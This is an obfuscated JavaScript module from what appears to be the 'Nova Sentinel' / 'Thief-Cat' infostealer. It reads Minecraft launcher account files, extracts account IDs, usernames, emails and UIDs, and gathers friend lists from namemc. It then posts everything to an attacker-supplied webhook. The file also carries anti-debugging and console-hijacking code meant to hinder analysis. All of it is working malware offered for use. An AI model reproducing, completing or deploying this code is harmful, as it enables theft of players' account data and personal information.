const _0x1c3a58 = (function () {
    let _0x5ef176 = true
    return function (_0x1247a2, _0x5265b8) {
      const _0x46cb70 = _0x5ef176
        ? function () {
            if (_0x5265b8) {
              const _0x437a8f = _0x5265b8.apply(_0x1247a2, arguments)
              return (_0x5265b8 = null), _0x437a8f
            }
          }
        : function () {}
      return (_0x5ef176 = false), _0x46cb70
    }
  })(),
  _0xed99fb = _0x1c3a58(this, function () {
    return _0xed99fb
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0xed99fb)
      .search('(((.+)+)+)+$')
  })
_0xed99fb()
const _0x50f719 = (function () {
  let _0x2e80a5 = true
  return function (_0x1f3eb9, _0xba8a33) {
    const _0xbaa533 = _0x2e80a5
      ? function () {
          if (_0xba8a33) {
            const _0x353a62 = _0xba8a33.apply(_0x1f3eb9, arguments)
            return (_0xba8a33 = null), _0x353a62
          }
        }
      : function () {}
    return (_0x2e80a5 = false), _0xbaa533
  }
})()
;(function () {
  _0x50f719(this, function () {
    const _0x36f40e = new RegExp('function *\\( *\\)'),
      _0x3f691c = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      _0x2eed77 = _0x2e3620('init')
    !_0x36f40e.test(_0x2eed77 + 'chain') || !_0x3f691c.test(_0x2eed77 + 'input')
      ? _0x2eed77('0')
      : _0x2e3620()
  })()
})()
const _0x318e0c = (function () {
  let _0x298fc7 = true
  return function (_0x156e40, _0x51c39e) {
    const _0x327c39 = _0x298fc7
      ? function () {
          if (_0x51c39e) {
            const _0x1eb833 = _0x51c39e.apply(_0x156e40, arguments)
            return (_0x51c39e = null), _0x1eb833
          }
        }
      : function () {}
    return (_0x298fc7 = false), _0x327c39
  }
})()
const _0x14103e = _0x318e0c(this, function () {
  let _0x1d9a53
  try {
    const _0x1dad33 = Function(
      'return (function() {}.constructor("return this")( ));'
    )
    _0x1d9a53 = _0x1dad33()
  } catch (_0x3c60f4) {
    _0x1d9a53 = window
  }
  const _0x3db7f1 = (_0x1d9a53.console = _0x1d9a53.console || {})
  const _0x162c5d = [
    'log',
    'warn',
    'info',
    'error',
    'exception',
    'table',
    'trace',
  ]
  for (let _0x3635e5 = 0; _0x3635e5 < _0x162c5d.length; _0x3635e5++) {
    const _0x19747e = _0x318e0c.constructor.prototype.bind(_0x318e0c),
      _0x4a63ea = _0x162c5d[_0x3635e5],
      _0x14f72b = _0x3db7f1[_0x4a63ea] || _0x19747e
    _0x19747e['__proto__'] = _0x318e0c.bind(_0x318e0c)
    _0x19747e.toString = _0x14f72b.toString.bind(_0x14f72b)
    _0x3db7f1[_0x4a63ea] = _0x19747e
  }
})
_0x14103e()
const _0x4f89f5 = require('axios'),
  { stat: _0x2d877e } = require('./stats'),
  _0x4f6f35 = require('fs')
async function _0x2577fa(_0x373e3b) {
  for (const _0x379847 of _0x2d877e.minecraft_account) {
    try {
      let _0xb259ba = [],
        _0x58f1f4 = 0
      const _0x41cc51 = _0x4f6f35.readFileSync(_0x379847, 'utf-8'),
        _0x2fb69c = JSON.parse(_0x41cc51),
        _0x454bf6 = _0x2fb69c.accounts
      if (_0x454bf6) {
        for (const _0x358a3c in _0x454bf6) {
          const _0x58b54d = /[\w\.-]+@[a-zA-Z\d\.-]+\.[a-zA-Z]{2,}/g,
            _0x271a59 = JSON.stringify(_0x454bf6).match(_0x58b54d),
            _0xd7d2e = _0x454bf6[_0x358a3c].minecraftProfile
          if (_0xd7d2e) {
            const _0x57eed6 = await _0x4f89f5.get(
              'https://api.namemc.com/profile/' + _0xd7d2e.id + '/friends'
            )
            _0x57eed6.status === 200 &&
              _0x57eed6.data.length > 0 &&
              ((_0xb259ba = _0x57eed6.data.map((_0x280557) => _0x280557.name)),
              (_0x58f1f4 = _0xb259ba.length))
            const _0x160380 = {
              username: 'Nova Sentinel',
              avatar_url:
                'https://raw.githubusercontent.com/FalseKSCH/assets/main/novalogo3.png',
              embeds: [
                {
                  title: 'Nova Minecraft Account',
                  thumbnail: {
                    url:
                      'https://crafatar.com/renders/head/' +
                      _0xd7d2e.id +
                      '.png',
                  },
                  color: 1638163,
                  description:
                    '[<:nova:1132934190032244786> Nova Sentinel On Top](https://github.com/FalseKSCH/Thief-Cat)\n\n[Download Skin](https://crafatar.com/skins/' +
                    _0xd7d2e.id +
                    '.png)\n[Download Capes](http://s.optifine.net/capes/' +
                    _0xd7d2e.name +
                    '.png)',
                  fields: [
                    {
                      name: '<a:637830095555241678:1132363184116871278> Account ID:',
                      value: '```' + _0x358a3c + '```',
                      inline: false,
                    },
                    {
                      name: '<:gapple:1132350100014891018> Username:',
                      value: '```' + _0xd7d2e.name + '```',
                      inline: false,
                    },
                    {
                      name: '<:mail:1130451375495589968> Email Found:',
                      value: '```' + (_0x271a59 || 'None') + '```',
                      inline: false,
                    },
                    {
                      name: '<a:Yellow_key1:1132350115567386794> Minecraft UID',
                      value: '```' + _0xd7d2e.id + '```',
                      inline: false,
                    },
                    {
                      name: '<:namemc:281534848101777408> Friends Count',
                      value: '```' + (_0x58f1f4 || 0) + '```',
                      inline: false,
                    },
                    {
                      name: '<:namemc:281534848101777408> Friends List:',
                      value: '```' + (_0xb259ba.join(', ') || 'None') + '```',
                      inline: true,
                    },
                  ],
                  footer: {
                    text: 'Nova | https://github.com/FalseKSCH/Thief-Cat',
                  },
                },
              ],
            }
            try {
              await _0x4f89f5({
                url: _0x373e3b,
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                data: _0x160380,
              })
            } catch (_0x51396f) {}
          }
        }
      }
    } catch (_0x3ca408) {}
  }
}
module.exports = { finduid: _0x2577fa }
function _0x2e3620(_0x5e5763) {
  function _0x7cbca7(_0x307ae6) {
    if (typeof _0x307ae6 === 'string') {
      return function (_0xe05d4f) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x307ae6 / _0x307ae6).length !== 1 || _0x307ae6 % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x7cbca7(++_0x307ae6)
  }
  try {
    if (_0x5e5763) {
      return _0x7cbca7
    } else {
      _0x7cbca7(0)
    }
  } catch (_0x129866) {}
}
